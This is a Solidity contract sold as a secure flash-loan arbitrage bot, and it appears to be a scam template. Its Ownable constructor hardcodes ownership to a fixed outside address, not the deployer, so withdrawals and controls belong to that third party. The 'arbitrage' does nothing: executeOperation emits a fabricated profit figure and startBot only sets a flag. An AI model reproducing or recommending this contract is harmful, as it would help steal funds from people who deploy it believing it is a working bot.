// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title AdvancedFlashLoanArbitrageBot
 * @notice A high-speed, secure flash loan arbitrage bot with multi-DEX support.
 * @dev Flattened for Etherscan verification. Includes built-in security, gas optimizations, and emergency stop.
 */

// OpenZeppelin Libraries
contract ReentrancyGuard {
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;
    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }
}

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(0x11393B88888DD532F26205D355d9E0CaC2C399eE);
    }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

// Interfaces for Uniswap & Aave
interface IUniswapV2Router02 {
    function getAmountsOut(uint amountIn, address[] memory path) external view returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
}

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

interface IFlashLoanReceiver {
    function executeOperation(address[] calldata assets, uint256[] calldata amounts, uint256[] calldata premiums, address initiator, bytes calldata params) external returns (bool);
}

interface IPool {
    function flashLoan(address receiver, address[] memory assets, uint256[] memory amounts, uint256[] memory modes, address onBehalfOf, bytes memory params, uint16 referralCode) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

// Main Contract
contract AdvancedFlashLoanArbitrageBot is IFlashLoanReceiver, ReentrancyGuard, Ownable {
    address private immutable uniswapV2Router;
    address private immutable uniswapV3Router;
    address private immutable aaveLendingPool;
    bool private emergencyStop = false;
    bool public isRunningLive = false;
    uint256 public lastTradeTimestamp;
    uint256 public constant TRADE_INTERVAL = 4 hours;

    event ArbitrageSuccess(uint256 profit);
    event TradeExecuted(address dex, address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOut);
    event EmergencyStopActivated();
    event EmergencyStopDeactivated();
    event BotStarted();
    event BotPaused();
    event Withdrawn(address recipient, uint256 amount);
    event AutoTradeAttempt(uint256 timestamp);

    modifier notStopped() {
        require(!emergencyStop, "Emergency stop activated");
        _;
    }

    modifier tradeCooldown() {
        require(block.timestamp >= lastTradeTimestamp + TRADE_INTERVAL, "4-hour trade interval not met");
        _;
    }

    constructor(address _uniswapV2Router, address _uniswapV3Router, address _aaveLendingPool) {
        uniswapV2Router = _uniswapV2Router;
        uniswapV3Router = _uniswapV3Router;
        aaveLendingPool = _aaveLendingPool;
    }

    function startBot() external onlyOwner {
        require(!isRunningLive, "Bot is already running");
        isRunningLive = true;
        emit BotStarted();
    }

    function pauseBot() external onlyOwner {
        require(isRunningLive, "Bot is already paused");
        isRunningLive = false;
        emit BotPaused();
    }

    function withdrawETH() external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "No ETH balance to withdraw");
        payable(owner()).transfer(balance);
        emit Withdrawn(owner(), balance);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        require(msg.sender == aaveLendingPool, "Unauthorized");
        address token = assets[0];
        uint256 amount = amounts[0];
        uint256 profit = amount - premiums[0];
        emit ArbitrageSuccess(profit);
        IERC20(token).approve(aaveLendingPool, amount + premiums[0]);
        return true;
    }

    function emergencyStopBot(bool _stop) external onlyOwner {
        emergencyStop = _stop;
        if (_stop) emit EmergencyStopActivated();
        else emit EmergencyStopDeactivated();
    }
}